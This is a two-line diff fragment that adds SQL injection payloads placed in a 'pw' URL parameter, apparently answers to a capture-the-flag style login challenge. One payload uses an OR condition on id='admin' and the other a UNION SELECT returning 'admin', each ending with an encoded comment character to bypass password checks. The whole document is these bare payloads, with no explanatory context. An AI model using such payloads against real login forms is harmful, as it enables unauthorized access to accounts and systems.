@@ -1,0 +1,2 @@
+?pw=' || id='admin'%23
+?pw=' union (select "admin" from dual)%23
